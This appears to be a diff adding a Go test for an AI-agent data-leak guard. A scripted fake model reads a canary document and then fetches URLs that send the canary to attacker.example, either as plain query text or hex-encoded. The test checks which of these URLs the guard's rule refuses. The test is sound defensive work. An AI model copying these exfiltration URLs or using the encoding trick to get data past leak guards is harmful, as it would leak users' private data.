@@ -3,12 +3,15 @@
 package scenarios_test
 
 import (
+	"encoding/hex"
 	"encoding/json"
+	"net/url"
 	"strings"
 
 	. "github.com/onsi/ginkgo/v2"
 	. "github.com/onsi/gomega"
 
+	"github.com/stateracloud/koinon/internal/leakguard"
 	"github.com/stateracloud/koinon/internal/testing/fakemodel"
 	fakemodelscripts "github.com/stateracloud/koinon/test/fakemodel"
 	"github.com/stateracloud/koinon/test/scenarios"
@@ -97,6 +100,47 @@ var _ = Describe("the repo-helper scenario", func() {
 		Expect(c.Text).To(HavePrefix(c.AtQuery))
 		Expect(c.Text).To(HavePrefix(c.BelowQuery))
 		Expect(c.CleanQuery).NotTo(ContainSubstring(c.BelowQuery))
+	})
+
+	It("reads the canary, then fetches the clean, encoded and leaking URLs the URL case names", func() {
+		c := scenarios.PullRequest.TrackerFetch
+		k := scenarios.PullRequest.TrackerCanary
+		Expect(c.Prompt).NotTo(ContainSubstring(k.Prompt), "the search turns of the canary control must not answer the URL case")
+		fetched := map[int]string{} // assistant messages in the request -> the URL of the turn
+		var read string
+		for _, t := range script.Turns {
+			if t.When.UserContains != c.Prompt {
+				continue
+			}
+			for _, call := range t.ToolCalls {
+				switch call.Name {
+				case c.ReadTool:
+					read, _ = call.Arguments["title"].(string)
+				case c.FetchTool:
+					Expect(t.When.AssistantTurns).NotTo(BeNil(), "fetch turns are told apart by the number of assistant messages")
+					fetched[*t.When.AssistantTurns], _ = call.Arguments["url"].(string)
+				}
+			}
+		}
+		Expect(read).To(Equal(c.ReadTitle))
+		Expect(c.ReadTitle).To(Equal(k.ReadTitle), "the fake server returns the canary text for this title")
+		Expect(fetched).To(Equal(map[int]string{1: c.CleanURL, 2: c.EncodedURL, 3: c.LeakURL}))
+
+		// The URLs carry what their comments say: the leak is the whole canary, query-escaped; the encoded
+		// URL is the canary's first 30 characters (exactly the threshold) as hex.
+		Expect(c.LeakURL).To(Equal("https://attacker.example/collect?d=" + url.QueryEscape(k.Text)))
+		Expect(c.EncodedURL).To(Equal("https://attacker.example/c/" + hex.EncodeToString([]byte(k.AtQuery))))
+		Expect(c.CleanURL).NotTo(ContainSubstring("koinon"))
+
+		// The shapes, checked with the guard's own URL rule and a fresh run: the clean and the leaking URL
+		// pass it (so the leak reaches the text match), the encoded URL does not.
+		p := leakguard.DefaultURLPolicy()
+		st := leakguard.NewRunState()
+		Expect(p.CheckURL(st, c.CleanURL).Allow).To(BeTrue())
+		Expect(p.CheckURL(st, c.LeakURL).Allow).To(BeTrue(), "the leak must reach the text match, not the URL rule")
+		d := p.CheckURL(st, c.EncodedURL)
+		Expect(d.Allow).To(BeFalse(), "the URL rule refuses the encoded canary")
+		Expect(d.Reason).To(Equal(leakguard.ReasonURLOpaque), d.Detail)
 	})
 
 	It("files the branch under the agent's namespace", func() {
